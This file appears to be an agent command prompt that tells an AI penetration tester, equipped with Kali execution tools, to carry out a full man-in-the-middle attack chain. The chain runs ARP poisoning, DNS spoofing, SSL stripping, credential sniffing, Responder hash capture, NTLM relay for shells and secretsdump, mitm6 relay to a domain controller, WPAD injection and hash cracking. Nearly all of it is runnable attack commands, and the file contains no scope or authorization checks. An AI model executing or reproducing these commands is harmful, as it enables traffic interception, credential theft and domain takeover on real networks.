---
description: Network MITM attack suite — ARP poisoning, DNS spoofing, SSL stripping, credential sniffing, responder LLMNR/NBT-NS, NTLM relay to shell/secretsdump, IPv6 MITM (mitm6), WPAD injection
argument-hint: <interface> [target-ip] [gateway-ip] (e.g. eth0 192.168.1.50 192.168.1.1)
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-mitm — Network Man-in-the-Middle Attack Suite

You are an expert network penetration tester. From a position on the local network, execute a full MITM attack chain: establish an ARP poison position between the target and gateway, sniff credentials from all protocols, poison LLMNR/NBT-NS to capture NTLMv2 hashes, relay NTLM authentication to gain shells or dump credentials, and use IPv6 to bypass defenses. Every phase builds on the last — passive sniff → active MITM → relay → shell.

---

## Step 0 — Parse Arguments & Setup

`$ARGUMENTS` = `<interface> [target-ip] [gateway-ip]`
- `IFACE` = first argument (required, e.g. `eth0`)
- `TARGET_IP` = second argument (optional — if omitted, MITM entire subnet)
- `GATEWAY_IP` = third argument (optional — auto-detected if omitted)

```bash
IFACE=<interface>
TARGET_IP="${2:-}"   # optional
GATEWAY_IP="${3:-}"  # optional
ENG=/home/kali/current
KALI_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
SUBNET=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+/\d+' | head -1 | sed 's|\.[0-9]*/|.0/|')
mkdir -p $ENG/{loot/{hashes,credentials,pcaps},poc/requests,scans} 2>/dev/null

# Auto-detect gateway if not provided
[ -z "$GATEWAY_IP" ] && GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -1)
# Auto-detect domain for IPv6 MITM
DOMAIN=$(cat /etc/resolv.conf 2>/dev/null | grep "search\|domain" | awk '{print $2}' | head -1)
[ -z "$DOMAIN" ] && DOMAIN="corp.local"

echo "=== pt-mitm Setup ==="
echo "  Interface : $IFACE"
echo "  Kali IP   : $KALI_IP"
echo "  Subnet    : $SUBNET"
echo "  Gateway   : $GATEWAY_IP"
echo "  Target    : ${TARGET_IP:-ALL HOSTS (subnet-wide)}"
echo "  Domain    : $DOMAIN"
echo ""

# Enable IP forwarding (CRITICAL — without this, you'll drop traffic and DoS the target)
echo "--- Enabling IP forwarding ---"
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward | grep -q "1" && echo "  [+] IP forwarding: ENABLED" || echo "  [-] IP forwarding FAILED"

# Check required tools
echo ""
echo "--- Tool availability ---"
for tool in bettercap responder ntlmrelayx.py arpspoof; do
    which $tool 2>/dev/null && echo "  [+] $tool" || echo "  [-] $tool (install: apt install -y bettercap dsniff)"
done
which mitm6 2>/dev/null && echo "  [+] mitm6" || echo "  [-] mitm6 (install: pip3 install mitm6)"
```

---

## Phase 1 — Passive Network Reconnaissance (Sniff Before Attacking)

Always start passively — understand what's on the network before active attacks:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 1] Passive Sniff (30 seconds) ==="
echo "Identifying hosts, protocols, and any plain-text credentials..."
echo ""

# bettercap passive probe — discovers all hosts + their traffic patterns
timeout 30 bettercap -iface "$IFACE" -eval "
set log.output $ENG/loot/pcaps/bettercap_passive.log;
net.probe on;
net.sniff on;
sleep 25;
quit
" 2>/dev/null | grep -E "host|credential|password|user|login|plain" | head -30

echo ""
echo "--- ARP table (all discovered hosts) ---"
arp -a 2>/dev/null | grep -v "incomplete" | head -30

echo ""
echo "--- Listening for plain-text protocols (tcpdump 30s) ---"
timeout 30 tcpdump -i "$IFACE" -A -s 0 \
    'port 21 or port 23 or port 25 or port 110 or port 143 or port 80' \
    2>/dev/null | grep -iE "user|pass|login|auth|bearer|basic" | head -20 &

# Also listen for SMB/NTLM authentication attempts
timeout 30 tcpdump -i "$IFACE" -A -s 0 'port 445 or port 139' 2>/dev/null | \
    grep -iE "ntlm|negotiate|auth" | head -10
```

---

## Phase 2 — ARP Poisoning (MITM Position)

Insert Kali between the target and gateway so all traffic flows through us:

```bash
IFACE=<interface>
TARGET_IP=<target_ip_or_subnet>
GATEWAY_IP=<gateway_ip>
ENG=/home/kali/current

echo "=== [Phase 2] ARP Poisoning ==="
echo "Inserting between $TARGET_IP and $GATEWAY_IP..."
echo ""

# bettercap is the cleanest ARP spoof tool — handles gratuitous ARPs, supports subnet-wide
cat > /tmp/arp_spoof.cap << EOF
set arp.spoof.targets $TARGET_IP
set arp.spoof.fullduplex true
set arp.spoof.internal true
arp.spoof on
net.sniff on
set net.sniff.verbose true
set net.sniff.output $ENG/loot/pcaps/mitm_capture.pcap
EOF

echo "Starting bettercap ARP spoof (run in background job)..."
echo "bettercap -iface $IFACE -caplet /tmp/arp_spoof.cap"
echo ""
echo "Alternatively, use arpspoof (two terminals needed):"
echo "  Terminal 1: arpspoof -i $IFACE -t $TARGET_IP $GATEWAY_IP"
echo "  Terminal 2: arpspoof -i $IFACE -t $GATEWAY_IP $TARGET_IP"
echo ""

# Start bettercap ARP spoof in background
bettercap -iface "$IFACE" -eval "
set arp.spoof.targets $TARGET_IP;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on;
set net.sniff.output $ENG/loot/pcaps/mitm_capture.pcap;
" 2>/dev/null &
BETTERCAP_PID=$!
echo "bettercap PID: $BETTERCAP_PID (kill when done)"
echo ""
echo "Verifying MITM position (wait 10s)..."
sleep 10
arp -a | grep "$TARGET_IP" | grep -q "$KALI_IP" && \
    echo "  [+] ARP cache poisoned — MITM position established" || \
    echo "  [-] ARP poison not confirmed yet (may take 30s)"
```

---

## Phase 3 — DNS Spoofing

Once in MITM position, redirect DNS queries to Kali-hosted services:

```bash
IFACE=<interface>
TARGET_IP=<target_ip>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 3] DNS Spoofing ==="
echo ""

# Configure bettercap DNS spoof
# Redirect all *.corp.local, *.internal → Kali (for credential harvesting page)
bettercap -iface "$IFACE" -eval "
set dns.spoof.all true;
set dns.spoof.domains *.corp.local,*.internal,*.local,update.microsoft.com,windowsupdate.microsoft.com;
set dns.spoof.address $KALI_IP;
dns.spoof on;
" 2>/dev/null &

echo "DNS spoof targets: *.corp.local, *.internal, *.local → $KALI_IP"
echo ""
echo "--- Set up phishing HTTP server (optional) ---"
echo "# Quick HTTP server to capture credentials:"
echo "  python3 -m http.server 80 -d /var/www/html/"
echo ""
echo "# Or start Apache with credential capture:"
echo "  systemctl start apache2"
echo "  # Serve a cloned login page and log POSTed credentials"
echo ""
echo "--- Verify DNS spoofing from target (if you have shell) ---"
echo "  nslookup corp.local <target-ip>  # should resolve to $KALI_IP"
```

---

## Phase 4 — SSL Stripping

Downgrade HTTPS to HTTP to capture plain-text credentials:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 4] SSL Stripping ==="
echo ""

# bettercap hstshijack — most effective SSL strip technique
# Requires ARP poison to be active (Phase 2)
cat > /tmp/hstshijack.cap << 'EOF'
# hstshijack SSL strip caplet
set hstshijack.log /tmp/hstshijack.log
set hstshijack.ignore *
set hstshijack.targets corp.com,example.com,*.corp.local
set hstshijack.replacements corp.com:corp.corn,example.com:example.corn
set hstshijack.strip.credentials true
hstshijack/hstshijack
EOF

# Check if hstshijack caplet is available
ls /usr/share/bettercap/caplets/hstshijack/ 2>/dev/null && {
    echo "Starting SSL stripping via hstshijack..."
    bettercap -iface "$IFACE" -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap 2>/dev/null &
} || {
    echo "hstshijack not found. Using sslstrip..."
    # iptables redirect to sslstrip
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    sslstrip -l 10000 -w $ENG/loot/pcaps/sslstrip.log 2>/dev/null &
    echo "sslstrip running on port 10000"
}

echo ""
echo "Monitoring for stripped HTTPS credentials..."
tail -f $ENG/loot/pcaps/sslstrip.log 2>/dev/null | grep -iE "user|pass|login|auth" &
```

---

## Phase 5 — Credential Sniffing

Capture all plain-text credentials crossing our MITM position:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 5] Credential Sniffing ==="
echo ""

# bettercap net.sniff — auto-extracts credentials from many protocols
bettercap -iface "$IFACE" -eval "
net.sniff on;
set net.sniff.verbose true;
set net.sniff.regexp .*password.*|.*passwd.*|.*user.*|.*login.*;
set net.sniff.output $ENG/loot/pcaps/credentials.pcap;
" 2>/dev/null | tee $ENG/loot/credentials/sniffed_creds.txt | \
grep -iE "password|passwd|user|login|auth|credential|bearer" &

echo "Sniffing credentials from:"
echo "  FTP (port 21)  — plain-text USER/PASS"
echo "  Telnet (23)    — plain-text login"
echo "  HTTP (80)      — Basic auth, POST form data"
echo "  SMTP (25/587)  — AUTH PLAIN, EHLO/MAIL"
echo "  POP3 (110)     — USER/PASS"
echo "  IMAP (143)     — LOGIN command"
echo ""
echo "Credential output → $ENG/loot/credentials/sniffed_creds.txt"
echo ""

# Also run tcpdump for raw PCAP analysis
tcpdump -i "$IFACE" -w "$ENG/loot/pcaps/full_capture_$(date +%Y%m%d_%H%M).pcap" \
    -s 65535 2>/dev/null &
echo "Full PCAP → $ENG/loot/pcaps/ (analyze offline with Wireshark or strings)"
```

---

## Phase 6 — Responder (LLMNR/NBT-NS/MDNS Poisoning)

Poison Windows name resolution to capture NTLMv2 hashes without any MITM position needed:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 6] Responder — LLMNR/NBT-NS Poisoning ==="
echo ""
echo "Responder poisons LLMNR/NBT-NS/MDNS lookups for non-existent hosts."
echo "Every Windows machine that looks up a share (\\\\fileserver\\, \\\\backup\\, etc.)"
echo "and gets a NXDOMAIN response will trigger Responder's fake server."
echo "Result: NTLMv2 hash captured for every Windows user on the network."
echo ""

# Backup Responder config (don't serve SMB/HTTP if relaying in Phase 7)
cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak 2>/dev/null

echo "Starting Responder..."
responder -I "$IFACE" -rdwPF 2>/dev/null | \
    tee $ENG/loot/hashes/responder_output.txt | \
    grep -E "NTLMv2|NTLMv1|Hash:|Captured" &

RESPONDER_PID=$!
echo "Responder PID: $RESPONDER_PID"
echo ""
echo "Captured hashes → /usr/share/responder/logs/ and $ENG/loot/hashes/responder_output.txt"
echo ""
echo "To crack captured NTLMv2 hashes:"
echo "  hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt -r best64.rule"
echo "  john --format=netntlmv2 /usr/share/responder/logs/SMB-NTLMv2-*.txt --wordlist=/usr/share/wordlists/rockyou.txt"
echo ""
echo "Monitor hash captures (live):"
echo "  watch -n2 'ls -la /usr/share/responder/logs/*.txt 2>/dev/null | tail -5'"
```

---

## Phase 7 — NTLM Relay (Hash → Shell without Cracking)

Instead of cracking hashes, relay them directly to other hosts for instant access:

```bash
IFACE=<interface>
GATEWAY_IP=<gateway_ip>
SUBNET=<subnet>
ENG=/home/kali/current

echo "=== [Phase 7] NTLM Relay Attack ==="
echo ""
echo "When Responder captures NTLM auth, relay it directly to other SMB/LDAP targets."
echo "Result: shell or secretsdump WITHOUT needing to crack the hash."
echo ""

# IMPORTANT: Disable Responder's SMB and HTTP servers before relaying
# (Otherwise Responder serves instead of relaying)
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf 2>/dev/null
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf 2>/dev/null
echo "[!] Disabled Responder SMB+HTTP servers (required for relay)"

# Build target list — all hosts in subnet with SMB signing disabled
echo "--- Finding relay targets (SMB signing not required) ---"
netexec smb "$SUBNET" --gen-relay-list $ENG/loot/relay_targets.txt 2>/dev/null
echo "Relay targets (SMB signing NOT enforced):"
cat $ENG/loot/relay_targets.txt 2>/dev/null | head -20
echo ""

# Start ntlmrelayx in background
echo "Starting ntlmrelayx.py..."
echo "Option A: Relay to SMB → shell"
echo "  ntlmrelayx.py -tf $ENG/loot/relay_targets.txt -smb2support --shell cmd"
echo ""
echo "Option B: Relay to SMB → secretsdump (credential dump)"
echo "  ntlmrelayx.py -tf $ENG/loot/relay_targets.txt -smb2support --secretsdump"
echo ""
echo "Option C: Relay to LDAP → create user or add to admins"
echo "  ntlmrelayx.py -tf ldap://<dc-ip> -smb2support --escalate-user <compromised-user>"
echo ""

# Start ntlmrelayx (secretsdump mode by default)
ntlmrelayx.py \
    -tf "$ENG/loot/relay_targets.txt" \
    -smb2support \
    --secretsdump \
    -of $ENG/loot/hashes/relayed_hashes.txt \
    2>/dev/null | tee $ENG/loot/hashes/ntlmrelayx_output.txt | \
    grep -E "Administrator|hash|relayed|SUCCEED|shell" &

RELAY_PID=$!
echo "ntlmrelayx PID: $RELAY_PID"
echo ""
echo "Now restart Responder (with SMB/HTTP OFF) to feed ntlmrelayx:"
echo "  responder -I $IFACE -rdw 2>/dev/null"
echo ""
echo "Dumped hashes → $ENG/loot/hashes/relayed_hashes.txt"
echo "Relay log → $ENG/loot/hashes/ntlmrelayx_output.txt"
```

---

## Phase 8 — IPv6 MITM (Bypass LLMNR Defenses)

Many networks have disabled LLMNR/NBT-NS but forget IPv6. This attack works even on hardened networks:

```bash
IFACE=<interface>
DOMAIN=<domain>
ENG=/home/kali/current

echo "=== [Phase 8] IPv6 MITM via mitm6 ==="
echo ""
echo "mitm6 abuses the Windows IPv6 configuration (even when LLMNR is disabled)."
echo "It responds to DHCPv6 requests to assign itself as the IPv6 DNS server."
echo "Result: all DNS queries → Kali → WPAD PAC file → all HTTP goes through Kali."
echo "Combined with ntlmrelayx: captures credentials from every Windows host, even admins."
echo ""

# Check if mitm6 is installed
which mitm6 2>/dev/null || {
    echo "mitm6 not found. Installing..."
    pip3 install mitm6 2>/dev/null || echo "Install manually: pip3 install mitm6"
}

# Start ntlmrelayx for LDAPS relay (needed for IPv6 attack)
echo "--- Starting ntlmrelayx for LDAPS (AD credential/session capture) ---"
DC_IP=$(nslookup -type=SRV _ldap._tcp.$DOMAIN 2>/dev/null | grep "internet address" | awk '{print $NF}' | head -1)
echo "DC IP: $DC_IP"

ntlmrelayx.py \
    -6 \
    -t "ldaps://$DC_IP" \
    -smb2support \
    --delegate-access \
    --add-computer \
    -of $ENG/loot/hashes/ipv6_relay_hashes.txt \
    2>/dev/null | tee $ENG/loot/hashes/ipv6_ntlmrelayx.txt | \
    grep -E "SUCCEED|delegate|computer|hash|shell" &

RELAY6_PID=$!
echo "ntlmrelayx (IPv6) PID: $RELAY6_PID"
echo ""

# Start mitm6 (DHCPv6 server + DNS6 spoof)
echo "--- Starting mitm6 DHCPv6 + DNS spoofing ---"
mitm6 -i "$IFACE" -d "$DOMAIN" \
    --ignore-nofqdn 2>/dev/null | \
    tee $ENG/loot/pcaps/mitm6.log | \
    grep -E "Sent|DNS|proxy|client" &

MITM6_PID=$!
echo "mitm6 PID: $MITM6_PID"
echo ""
echo "What happens next:"
echo "  1. Windows hosts request DHCPv6 → mitm6 assigns Kali as IPv6 DNS"
echo "  2. Host looks up WPAD via IPv6 DNS → mitm6 returns Kali IP"
echo "  3. Host authenticates to Kali's fake WPAD server (NTLM)"
echo "  4. ntlmrelayx relays auth to DC LDAPS → creates machine account or delegates"
echo "  5. Machine account can impersonate ANY domain user → DCSync"
echo ""
echo "Monitor: tail -f $ENG/loot/hashes/ipv6_ntlmrelayx.txt"
```

---

## Phase 9 — WPAD Proxy Injection

Inject WPAD to proxy all corporate HTTP traffic through Kali:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 9] WPAD Proxy Injection ==="
echo ""

# Responder handles WPAD PAC file serving automatically
# WPAD PAC file served at http://wpad/wpad.dat
cat > /tmp/wpad.dat << EOF
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "localhost")) return "DIRECT";
    return "PROXY $KALI_IP:8080; DIRECT";
}
EOF

# Serve WPAD file
mkdir -p /var/www/html/
cp /tmp/wpad.dat /var/www/html/wpad.dat
systemctl start apache2 2>/dev/null || python3 -m http.server 80 -d /var/www/html/ &

# Configure mitmproxy to capture and log all proxied traffic
which mitmproxy 2>/dev/null && {
    echo "Starting mitmproxy on port 8080..."
    mitmproxy -p 8080 \
        --save-stream-file $ENG/loot/pcaps/mitmproxy.pcap \
        --set stream_large_bodies=1m \
        2>/dev/null &
    echo "mitmproxy UI → http://$KALI_IP:8081"
} || echo "mitmproxy not installed — using tcpdump for capture"

echo ""
echo "WPAD file served at: http://$KALI_IP/wpad.dat"
echo "All Windows machines auto-discovering WPAD will proxy HTTP through $KALI_IP:8080"
echo ""
echo "Credentials captured by Responder WPAD:"
echo "  grep -iE 'user|pass|auth' /usr/share/responder/logs/*.txt"
```

---

## Phase 10 — Harvest Results

Collect and organize everything captured:

```bash
ENG=/home/kali/current

echo ""
echo "=== MITM Results ==="
echo ""

echo "--- NTLMv2 hashes captured (Responder) ---"
find /usr/share/responder/logs/ -name "*.txt" -newer /tmp -exec grep -h "NTLMv2\|::" {} \; 2>/dev/null | \
    tee $ENG/loot/hashes/all_ntlm_hashes.txt | head -20
HASH_COUNT=$(wc -l < $ENG/loot/hashes/all_ntlm_hashes.txt 2>/dev/null || echo 0)
echo "Total hashes: $HASH_COUNT"

echo ""
echo "--- Cracked hashes ---"
[ "$HASH_COUNT" -gt "0" ] && {
    echo "Cracking NTLMv2 hashes with hashcat..."
    hashcat -m 5600 $ENG/loot/hashes/all_ntlm_hashes.txt \
        /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule \
        --potfile-path $ENG/loot/hashes/hashcat.pot \
        -o $ENG/loot/hashes/cracked.txt \
        --status --status-timer=30 2>/dev/null | tail -10
    echo "Cracked passwords → $ENG/loot/hashes/cracked.txt"
    cat $ENG/loot/hashes/cracked.txt 2>/dev/null | head -10
}

echo ""
echo "--- Plain-text credentials sniffed ---"
cat $ENG/loot/credentials/sniffed_creds.txt 2>/dev/null | \
    grep -iE "user|pass|login" | sort -u | head -20

echo ""
echo "--- Relayed credentials (secretsdump results) ---"
cat $ENG/loot/hashes/ntlmrelayx_output.txt 2>/dev/null | \
    grep -E "Administrator|SAM|NTLM" | head -20

echo ""
echo "=== Next Steps ==="
echo "  → Spray cracked credentials: netexec smb <subnet> -u <user> -p '<pass>'"
echo "  → Use NTLM hashes for Pass-the-Hash: netexec smb <host> -u admin -H <ntlm_hash>"
echo "  → Escalate to domain: /pt-ad <domain> <dc-ip> <cracked-creds>"
echo "  → Dump full secrets: ntlmrelayx.py --secretsdump on more hosts"

# Save to engagement notes
cat >> $ENG/notes/engagement.md << EOF

---
## MITM Attack Results
**Date**: $(date)
**Interface**: $IFACE
**Hashes captured**: $HASH_COUNT
**Cracked**: $(wc -l < $ENG/loot/hashes/cracked.txt 2>/dev/null || echo 0)
**PCAP**: $ENG/loot/pcaps/
EOF
```

---

## Execution Rules

- **IP forwarding MUST be on** before any ARP spoofing — without it you create a DoS
- **Run Responder FIRST** (passive) — it works without MITM position and captures hashes from the whole network
- **Relay before crack** — NTLM relay (Phase 7) gives instant access without GPU time; cracking is fallback
- **IPv6 works when LLMNR is blocked** — Phase 8 bypasses "LLMNR disabled" hardening
- **STOP after engagement** — kill bettercap and arpspoof, restore ARP cache: `arpspoof -i $IFACE -t $TARGET $GATEWAY` (flush) then kill
- **Evidence** — full PCAPs are saved to `$ENG/loot/pcaps/` — include in report
